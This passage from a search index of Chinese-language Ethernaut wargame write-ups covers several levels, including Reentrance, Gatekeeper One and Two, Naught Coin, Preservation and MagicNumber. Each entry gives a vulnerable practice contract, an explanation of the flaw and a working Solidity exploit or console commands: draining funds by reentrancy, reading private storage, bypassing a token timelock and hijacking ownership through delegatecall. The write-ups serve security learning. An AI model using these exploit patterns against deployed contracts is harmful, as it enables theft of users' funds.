\u5c31\u5b9e\u73b0\u4e86\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u65ad\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u7684\u4f59\u989d\u76f4\u5230\u4e3a 0</p> <p>\u5148\u901a\u8fc7 <code>await getBalance(instance)</code> \u5f97\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\u7684 balance \u4e3a 0.001 ether\uff0c\u6240\u4ee5\u6bcf\u6b21 withdraw 0.001 ether \u5c31\u597d</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Reentrance */\n\ncontract Exploit {\n    Reentrance challenge;\n    constructor(address payable addr) public payable {\n        challenge = Reentrance(addr);\n    }\n    function exp() public {\n        challenge.withdraw(0.001 ether);\n    }\n    fallback() external payable {\n        if (address(challenge).balance &gt;= 0) {\n            challenge.withdraw(0.001 ether);\n        }\n    }\n}\n</code></pre> <p>\u9996\u5148\u76f4\u63a5\u90e8\u7f72\u5408\u7ea6\uff0c\u7136\u540e <code>contract.donate.sendTransaction(&lt;exp contract addr&gt;, {value: toWei(\"0.001\")})</code> \u5148 donate 0.001 ether\uff0c\u7136\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\u63d0\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4f59\u989d</p>"}, {"location": "writeups/ethernaut/#elevator", "title": "Elevator", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\n\ncontract Elevator {\n    bool public top;\n    uint public floor;\n\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n\n        if (! building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);\n        }\n    }\n}\n</code></pre> <p>\u76ee\u7684\u662f\u4f7f\u7535\u68af\u8fbe\u5230\u6700\u9876\u5c42\uff0c\u5373\u4f7f\u9898\u76ee\u5408\u7ea6\u7684 top \u4e3a true</p> <p>\u56e0\u4e3a top \u7684\u53d8\u5316\u53ea\u4f1a\u5728 goTo \u91cc\u53d1\u751f\u53d8\u5316\uff0c\u5e76\u4e14\u53ea\u6709\u5728 isLastFloor \u4e3a false \u7684\u65f6\u5019\u624d\u4f1a\u6539 top\uff0c\u800c\u4e14\u4e24\u6b21\u8c03\u7528 isLastFloor \u7684\u8f93\u5165\u4e00\u6837</p> <p>\u6240\u4ee5\u53ea\u9700\u8981\u8ba9\u7b2c\u4e00\u6b21\u8c03\u7528 isLastFloor \u8fd4\u56de false\uff0c\u7b2c\u4e8c\u6b21\u8fd4\u56de true \u5c31\u53ef\u4ee5\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Elevator */\n\ncontract Exploit {\n    Elevator elevator;\n    bool top = true;\n    constructor(address challenge) public {\n        elevator = Elevator(challenge);\n    }\n    function isLastFloor(uint) public returns (bool) {\n        top = !top;  // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c\n        return top;\n    }\n    function exp() public {\n        elevator.goTo(1);\n    }\n}\n</code></pre> <p>\u8fd9\u6837\u5728\u90e8\u7f72\u4e4b\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u8ba9 top \u4e3a true</p>"}, {"location": "writeups/ethernaut/#privacy", "title": "Privacy", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Privacy {\n\n    bool public locked = true;\n    uint256 public ID = block.timestamp;\n    uint8 private flattening = 10;\n    uint8 private denomination = 255;\n    uint16 private awkwardness = uint16(now);\n    bytes32[3] private data;\n\n    constructor(bytes32[3] memory _data) public {\n        data = _data;\n    }\n\n    function unlock(bytes16 _key) public {\n        require(_key == bytes16(data[2]));\n        locked = false;\n    }\n}\n</code></pre> <p>\u548c Vault \u90a3\u9898\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u8981\u8bfb\u53d6 private \u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 unlock</p> <p>\u540c\u6837\u6765\u7528 <code>web3.eth.getStorageAt</code> \u6765 dump \u51fa storage\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, 0)\n'0x0000000000000000000000000000000000000000000000000000000000000001'\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0x00000000000000000000000000000000000000000000000000000000623b0e73'\n&gt; await web3.eth.getStorageAt(instance, 2)\n'0x000000000000000000000000000000000000000000000000000000000e73ff0a'\n&gt; await web3.eth.getStorageAt(instance, 3)\n'0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569'\n&gt; await web3.eth.getStorageAt(instance, 4)\n'0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364'\n&gt; await web3.eth.getStorageAt(instance, 5)\n'0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf'\n&gt; await web3.eth.getStorageAt(instance, 6)\n'0x0000000000000000000000000000000000000000000000000000000000000000'\n</code></pre></p> <p>\u4e0d\u96be\u770b\u51fa 0 \u5904\u5b58\u50a8\u7684\u662f bool locked\uff0c1 \u5904\u662f\u4e00\u4e2a 256 \u4f4d ID\uff0c2 \u5904\u662f\u5269\u4e0b\u7684\u4e24\u4e2a uint8\u3001\u4e00\u4e2a uint16 \u62fc\u51fa\u6765\u7684\uff0c\u800c 3\uff5e5 \u5c31\u662f data \u4e86</p> <p>\u6240\u4ee5 data[2] \u4e5f\u5c31\u662f <code>0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf</code></p> <p>\u800c unlock \u9700\u8981 bytes16\uff0c\u800c\u4e14\u5728\u5185\u90e8\u5c06 data[2] \u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86 bytes16\uff0c\u8fd9\u4f1a\u53d6\u524d 16 \u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u8c03\u7528 unlock: <pre><code>contract.unlock(\"0x6710884543189de73f0dfb9d36a99f2a\")\n</code></pre></p>"}, {"location": "writeups/ethernaut/#gatekeeper-one", "title": "Gatekeeper One", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract GatekeeperOne {\n    using SafeMath for uint256;\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        require(gasleft().mod(8191) == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n        require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n        require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u901a\u8fc7\u4e09\u4e2a modifier \u7684\u68c0\u6d4b\uff0c\u5373\u6709\u4e09\u4e2a\u8981\u6c42</p> <ul> <li>msg.sender != tx.origin\uff1a\u5373\u901a\u8fc7\u4e00\u4e2a\u5408\u7ea6\u6765\u95f4\u63a5\u8c03\u7528 enter</li> <li>gasleft() % 8191 == 0\uff1a\u8fd0\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5269\u4f59\u7684 gas \u8981\u662f 8191 \u7684\u500d\u6570</li> <li>\u8f93\u5165\u7684 _gateKey \u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6</li> </ul> <p>\u7b2c\u4e00\u4e2a\u597d\u529e\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u5408\u7ea6\u5c31\u597d</p> <p>\u7b2c\u4e8c\u4e2a\u56e0\u4e3a\u8fc7\u7a0b\u4e2d\u4f1a\u6d88\u8017\u591a\u5c11 gas \u4e0d\u660e\u786e\uff0c\u6240\u4ee5\u8981\u5148\u5199\u4e00\u4e2a\u8bd5\u8bd5\u6765 debug\uff0c\u770b\u770b\u4e2d\u9014\u6d88\u8017\u4e86\u591a\u5c11 gas\uff1a <pre><code>contract Exploit {\n    GatekeeperOne challenge;\n    constructor(address addr) public {\n        challenge = GatekeeperOne(addr);\n    }\n    function exp() public {\n        challenge.enter.gas(81910)(bytes8(\"0x123456\"));\n    }\n}\n</code></pre> \u5148\u968f\u610f\u8bbe\u7f6e gas \u4e3a 81910\uff0c\u7136\u540e\u90e8\u7f72\u5408\u7ea6\u3001\u8c03\u7528\uff0cdebug\uff08\u9700\u8981\u8c03\u5230 JavaScript VM \u4e0a\uff0c\u4f7f\u7528 Inject \u7684 Rinkeby \u7f51\u7edc\u597d\u50cf\u6ca1\u6cd5\u8c03\u8bd5\uff09</p> <p>\u5355\u6b65\u8fd0\u884c\uff0c\u76f4\u5230\u6d41\u7a0b\u8fdb\u5165\u5230 gateTwo \u51fd\u6570\u4e2d\u7684 GAS \u6307\u4ee4\uff08\u5c06\u5269\u4f59\u7684 gas \u538b\u5165\u6808\u4e2d\uff09\uff0c\u6b64\u65f6\u663e\u793a\u5f53\u524d\u6b65 gas \u4e3a 2\uff0c\u5269\u4f59 gas \u4e3a 81658</p> <p>\u6240\u4ee5\u8f93\u5165\u7684 gas \u4e3a 81910 + (81910 - 81658) + 2 = 82164 \u65f6\uff0c\u538b\u5165\u6808\u4e2d\u7684 gas \u521a\u597d\u662f 81910</p> <p>\u5bf9\u4e8e\u7b2c\u4e09\u4e2a\uff0cbytes8 \u76f8\u5f53\u4e8e uint64\uff0c\u800c\u4e14\u4f7f\u7528 uintx \u6765\u5f3a\u5236\u8f6c\u6362\u65f6\u4ece\u540e\u5f80\u524d\u53d6\uff0c\u6240\u4ee5\u9700\u8981\u6ee1\u8db3\uff1a</p> <ul> <li>16~31 \u4f4d\uff08\u540e 3\u30014 \u5b57\u8282\uff09\u4e3a 0</li> <li>32 \u4f4d\u53ca\u4ee5\u4e0a\u4e0d\u5168\u4e3a 0</li> <li>0~15 \u4f4d\uff08\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u81ea\u5df1\u5730\u5740\u7684\u540e\u4e24\u4e2a\u5b57\u8282\u76f8\u540c</li> </ul> <p>\u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u51fa\u9700\u8981\u7684 bytes8 \u4e3a <code>bytes8(0x0000000100000E28)</code>\uff0c\u628a\u8fd9\u4e2a\u8f93\u5165\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u4e2a gate \u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    GatekeeperOne challenge;\n    constructor(address addr) public {\n        challenge = GatekeeperOne(addr);\n    }\n    function exp() public {\n        challenge.enter.gas(82164)(bytes8(0x0000000100000E28));\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#gatekeeper-two", "title": "Gatekeeper Two", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract GatekeeperTwo {\n\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        uint x;\n        assembly { x := extcodesize(caller()) }\n        require(x == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}\n</code></pre> <p>\u548c\u4e0a\u4e00\u9898\u4e00\u6837\uff0c\u4e5f\u662f\u6709\u4e09\u4e2a\u8981\u6c42\uff1a</p> <ul> <li>msg.sender != tx.origin</li> <li>\u5f53\u524d caller \u7684 codesize \u4e3a 0</li> <li>gateKey \u5f02\u6216 sender \u7684 keccak256 \u7684\u524d 8 \u5b57\u8282\u4e3a 0-1=0xFFFFFFFFFFFFFFFF</li> </ul> <p>\u7b2c\u4e00\u4e2a\u540c\u6837\u901a\u8fc7\u5408\u7ea6\u89e3\u51b3</p> <p>\u7b2c\u4e8c\u4e2a\uff0c\u5f53\u5408\u7ea6\u8fd8\u6ca1\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019 codesize \u4e3a 0\uff0c\u6240\u4ee5 exp \u8981\u5199\u5728 constructor \u91cc</p> <p>\u7b2c\u4e09\u4e2a\uff0c\u5f02\u6216\u8ba1\u7b97\u4e00\u4e0b\u5c31\u597d</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    GatekeeperTwo challenge;\n    constructor(address addr) public {\n        challenge = GatekeeperTwo(addr);\n        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0xFFFFFFFFFFFFFFFF);\n        challenge.enter(bytes8(key));\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#naught-coin", "title": "Naught Coin", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\ncontract NaughtCoin is ERC20 {\n\n    // string public constant name = 'NaughtCoin';\n    // string public constant symbol = '0x0';\n    // uint public constant decimals = 18;\n    uint public timeLock = now + 10 * 365 days;\n    uint256 public INITIAL_SUPPLY;\n    address public player;\n\n    constructor(address _player) \n    ERC20('NaughtCoin', '0x0')\n    public {\n        player = _player;\n        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n        // _totalSupply = INITIAL_SUPPLY;\n        // _balances[player] = INITIAL_SUPPLY;\n        _mint(player, INITIAL_SUPPLY);\n        emit Transfer(address(0), player, INITIAL_SUPPLY);\n    }\n\n    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n        super.transfer(_to, _value);\n    }\n\n    // Prevent the initial owner from transferring tokens until the timelock has passed\n    modifier lockTokens() {\n        if (msg.sender == player) {\n            require(now &gt; timeLock);\n            _;\n        } else {\n            _;\n        }\n    } \n} \n</code></pre> <p>\u6839\u636e ERC-20 \u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff0c\u5408\u7ea6\u5728 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol</p> <p>\u9898\u76ee\u7ed9 transfer \u51fd\u6570\u52a0\u4e86 modifier\uff0c\u5224\u65ad\u65f6\u95f4\u5927\u4e8e\u5341\u5e74\u624d\u4f1a\u901a\u8fc7\uff0c\u53d1\u51fa transfer</p> <p>\u4f46\u662f\u6839\u636e ERC-20 \u7684\u5408\u7ea6\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd8\u6709\u4e00\u4e2a transferFrom \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u8f6c\u79fb\u4ee3\u5e01</p> <pre><code>function transferFrom(\n    address from,\n    address to,\n    uint256 amount\n) public virtual override returns (bool) {\n    address spender = _msgSender();\n    _spendAllowance(from, spender, amount);\n    _transfer(from, to, amount);\n    return true;\n}\n</code></pre> <p>\u800c\u8fd9\u8981\u6d88\u8017 allowance\uff0c\u4f46\u662f approve \u51fd\u6570\u5e76\u6ca1\u6709\u65bd\u52a0\u9650\u5236\uff0c\u6240\u4ee5\u5148 approve \u4e00\u5b9a\u7684\u6570\u91cf\uff0c\u7136\u540e transferFrom \u5c31\u53ef\u4ee5\u8f6c\u79fb\u51fa player \u8eab\u4e0a\u7684\u5168\u90e8\u4ee3\u5e01\u4f59\u989d</p> <pre><code>&gt; (await contract.balanceOf(player)).toString()\n'1000000000000000000000000'\n&gt; contract.approve(player, \"1000000000000000000000000\")\n&gt; contract.transferFrom(player, instance, \"1000000000000000000000000\")\n&gt; (await contract.balanceOf(player)).toString()\n'0'\n</code></pre>"}, {"location": "writeups/ethernaut/#preservation", "title": "Preservation", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Preservation {\n\n    // public library contracts \n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner; \n    uint storedTime;\n    // Sets the function signature for delegatecall\n    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {\n        timeZone1Library = _timeZone1LibraryAddress; \n        timeZone2Library = _timeZone2LibraryAddress; \n        owner = msg.sender;\n    }\n\n    // set the time for timezone 1\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n\n    // set the time for timezone 2\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n    // stores a timestamp \n    uint storedTime;  \n\n    function setTime(uint _time) public {\n        storedTime = _time;\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\u3002\u4f46\u662f\u4ece\u9898\u76ee\u5408\u7ea6\u4e2d\u770b\u4e0d\u5230\u4efb\u4f55\u548c\u66f4\u6539 owner \u6709\u5173\u7684\u51fd\u6570</p> <p>\u6839\u636e\u63d0\u793a\uff0c\u8fd9\u4e2a\u5408\u7ea6\u7684\u6f0f\u6d1e\u5728\u4e8e\u901a\u8fc7 delegatecall \u4fee\u6539\u5b58\u50a8</p> <p>\u901a\u8fc7 delegatecall \u6765\u8c03\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684\u51fd\u6570\u5e76\u4e0d\u4f1a\u52a8\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 storage\uff0c\u800c\u662f\u4f7f\u7528\u672c\u5730 storage\u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5728 setFirstTime \u51fd\u6570\u4e2d\u8c03\u7528 setTime \u51fd\u6570\u65f6\u66f4\u6539 storedTime \u5b9e\u9645\u4e0a\u4f1a\u66f4\u6539\u5904\u4e8e storage \u4e2d\u76f8\u540c\u4f4d\u7f6e\u7684 timeZone1Library\u3002\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21\u8c03\u7528 setFirstTime \u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2a\u5730\u5740\u5408\u7ea6\u7684 setTime \u51fd\u6570</p> <p>\u56e0\u6b64\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5176\u4e2d\u5b9e\u73b0 setTime \u51fd\u6570\uff0c\u91cc\u9762\u5c06 owner \u6539\u4e3a\u8f93\u5165\uff08\u6ce8\u610f\u8981\u5c06\u653b\u51fb\u5408\u7ea6\u7684\u5185\u5b58\u5e03\u5c40\u641e\u7684\u548c Preservation \u5408\u7ea6\u76f8\u540c\uff09\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21 setFirstTime \u4f7f\u5c06 timeZone1Library \u6539\u4e3a\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21 setFirstTime \u5c31\u53ef\u4ee5\u8c03\u7528\u5230\u653b\u51fb\u5408\u7ea6\u7684 setTime \u51fd\u6570\uff0c\u66f4\u6539 owner\u3002\u653b\u51fb\u5408\u7ea6\uff1a</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;             // \u4fdd\u8bc1\u8fd9\u524d\u9762\u6709\u4e24\u4e2a address\n    function setTime(uint _time) public {\n        owner = address(_time);\n    }\n}\n</code></pre> <p>\u5b9e\u9645\u64cd\u4f5c\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000000&lt;an address&gt;'\n&gt; contract.setFirstTime(\"0x&lt;Exploit contract address&gt;\")\n&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000000&lt;Exploit contract address&gt;'\n&gt; contract.setFirstTime(player)\n&gt; await web3.eth.getStorageAt(instance, 2) // owner\n'0x000000000000000000000000&lt;player address&gt;'\n&gt; await contract.owner()\n'0x&lt;player address&gt;'\n</code></pre></p>"}, {"location": "writeups/ethernaut/#recovery", "title": "Recovery", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Recovery {\n\n    //generate tokens\n    function generateToken(string memory _name, uint256 _initialSupply) public {\n        new SimpleToken(_name, msg.sender, _initialSupply);\n\n    }\n}\n\ncontract SimpleToken {\n\n    using SafeMath for uint256;\n    // public variables\n    string public name;\n    mapping (address =&gt; uint) public balances;\n\n    // constructor\n    constructor(string memory _name, address _creator, uint256 _initialSupply) public {\n        name = _name;\n        balances[_creator] = _initialSupply;\n    }\n\n    // collect ether in return for tokens\n    receive() external payable {\n        balances[msg.sender] = msg.value.mul(10);\n    }\n\n    // allow transfers of tokens\n    function transfer(address _to, uint _amount) public { \n        require(balances[msg.sender] &gt;= _amount);\n        balances[msg.sender] = balances[msg.sender].sub(_amount);\n        balances[_to] = _amount;\n    }\n\n    // clean up after ourselves\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n</code></pre> <p>\u9898\u610f\u662f instance \u8c03\u7528\u4e86 generateToken \u751f\u6210\u4e86\u4e00\u4e2a SimpleToken\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\uff0c\u73b0\u5728\u8981\u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5176\u4e2d\u4f59\u989d\u8f6c\u5230 player \u8d26\u6237\u4e2d</p> <p>\u56e0\u4e3a\u533a\u5757\u94fe\u90fd\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb Etherscan \u7684 Rinkeby \u7f51\u7edc\u4e2d\u67e5\u627e instance \u8fd9\u4e2a\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u53ca\u5176\u4e2d\u7684 internal txns\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a Contract Creation\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u662f\u751f\u6210\u7684 SimpleToken \u5730\u5740\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a exp \u6765\u8c03\u7528\u90a3\u4e2a\u5730\u5740\u4e0a\u7684\u7684 destroy \u51fd\u6570\u5c31\u597d\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of SimpleToken */\n\ncontract Exploit {\n    SimpleToken token;\n    constructor(address payable challenge) public { // challenge \u662f\u627e\u5230\u7684 SimpleToken \u5730\u5740\n        token = SimpleToken(challenge);\n    }\n    function exp() public {\n        token.destroy(msg.sender);\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#magicnumber", "title": "MagicNumber", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract MagicNum {\n\n    address public solver;\n\n    constructor() public {}\n\n    function setSolver(address _solver) public {\n        solver = _solver;\n    }\n\n    /*\n        ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____        \n         __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___       \n          ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__      \n           ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___     \n            ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____    \n             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________   \n              _\\///////////\\\\\\//____/\\\\\\/___________  \n               ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ \n                ___________\\///_____\\///////////////__\n    */\n}\n</code></pre> <p>\u9898\u76ee\u8981\u6c42\u5373\u5199\u4e00\u4e2a\u5408\u7ea6\uff0c\u5b57\u8282\u7801\u4e0d\u8d85\u8fc7 10 \u4e2a\u5b57\u8282\uff0c\u5728\u8c03\u7528 whatIsTheMeaningOfLife() \u65f6\u8fd4\u56de 42</p> <p>\u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\uff0c\u6765\u5bf9\u4e8e\u6240\u6709\u8c03\u7528\u90fd\u76f4\u63a5\u8fd4\u56de 42\uff0c\u8981\u7528\u5230\u51e0\u4e2a\u6307\u4ee4\uff08\u53ef\u4ee5\u5728 https://ethervm.io/ \u770b\u5230\u8be6\u7ec6\u7684\u6307\u4ee4\u4e0e\u5b57\u8282\u7801\u7684\u5bf9\u5e94\u4ee5\u53ca\u4f5c\u7528\uff09</p> <ul> <li>PUSH1\uff0860\uff09\uff1a\u5c06\u4e00\u4e2a uint8 \u538b\u5165\u6808\u4e2d</li> <li>MSTORE\uff0852\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa value\uff0c\u5c06 memory[offset:offset+32] \u8bbe\u7f6e\u4e3a value</li> <li>RETURN\uff08F3\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa length\uff0creturn memory[offset:offset+length]</li> <li>CODECOPY\uff0839\uff09\uff1a\u4ece\u6808\u4e0a\u4f9d\u6b21\u53d6\u51fa destOffset\u3001offset\u3001length\uff0c\u8bbe\u7f6e memory[destOffset:destOffset+length] = code[offset:offset+length]</li> </ul> <p>\u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u6709\u4e00\u6bb5 deploy code\uff0c\u7528\u6765\u628a runtime code \u590d\u5236\u5230\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u7f16\u5199\u4e24\u90e8\u5206\u5b57\u8282\u7801</p> <p>runtime code: <pre><code>PUSH1 0x2a  ; \u5c06 42 \u538b\u5165\u6808\u4e2d\nPUSH1 0x80  ; \u8981\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u4e00\u822c\u4e3a 0x80\nMSTORE      ; \u8bbe\u7f6e memory[0x80:0x80+0x20] = 0x2a\nPUSH1 0x20  ; length \nPUSH1 0x80  ; offset\nRETURN      ; return memory[0x80:0x80+0x20]\n</code></pre> \u8f6c\u6362\u6210\u5b57\u8282\u7801\u5c31\u662f\uff1a602a 6080 52 6020 6080 f3</p> <p>\u63a5\u4e0b\u6765\u8981\u5199 deploy code\uff0c\u5176\u4e2d\u8981\u5b8c\u6210\u4e24\u4e2a\u76ee\u6807\uff1a</p> <ol> <li>\u5c06 runtime code \u5b57\u8282\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d</li> <li>\u5c06 runtime code \u8fd4\u56de</li> </ol> <p>EVM \u6c47\u7f16\uff1a <pre><code>PUSH1 0x0a  ; length, runtime code \u957f\u5ea6\u4e3a 10 (0x0a)\nPUSH1 0x0c  ; offset, \u5373 deploy code \u7684\u957f\u5ea6\uff0c\u6574\u4f53\u7b97\u4e0b\u6765\u4e3a 0x0C\nPUSH1 0x00  ; destOffset, \u5b58\u5165\u5185\u5b58\u4e2d\u8d77\u59cb\u4f4d\u7f6e\nCODECOPY    ; \u5c06 runtime code \u62f7\u8d1d\u5230\u5185\u5b58\u5f00\u5934\nPUSH1 0x0a  ; length\nPUSH1 0x00  ; offset\nRETURN      ; \u8fd4\u56de runtime code\n</code></pre> \u8f6c\u6362\u6210\u5b57\u8282\u7801\uff1a600a 600c 6000 39 600a 6000 f3\uff08\u957f\u5ea6\u6b63\u597d\u5bf9\u5e94 0x0c\uff09</p> <p>\u8fde\u8d77\u6765\u5c31\u662f\u6700\u7ec8\u7684\u5b57\u8282\u7801\uff1a600a600c600039600a6000f3602a60805260206080f3</p> <p>\u7136\u540e\u901a\u8fc7\u5411\u7a7a\u5730\u5740\u53d1\u9001\u4ea4\u6613\u7684\u5f62\u5f0f\u521b\u5efa\u5408\u7ea6\uff0c\u5e76\u627e\u5230\u5408\u7ea6\u5730\u5740\u518d setSolver \u5373\u53ef <pre><code>&gt; web3.eth.sendTransaction({from: player, data: \"0x600a600c600039600a6000f3602a60805260206080f3\"})\n\u26cf\ufe0f Sent transaction \u26cf https://rinkeby.etherscan.io/tx/&lt;transaction hash&gt;\n\u26cf\ufe0f Mined transaction \u26cf https://rinkeby.etherscan.io/tx/&lt;transaction hash&gt;\n&gt; contract.setSolver(\"&lt;contract address&gt;\")\n</code></pre> \u5176\u4e2d contract address \u901a\u8fc7\u8bbf\u95ee\u7ed9\u51fa\u7684 etherscan \u7684\u7f51\u5740\u5c31\u53ef\u4ee5\u67e5\u5230\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740</p>"}, {"location": "writeups/ethernaut/#alien-codex", "title": "Alien Codex", "text": 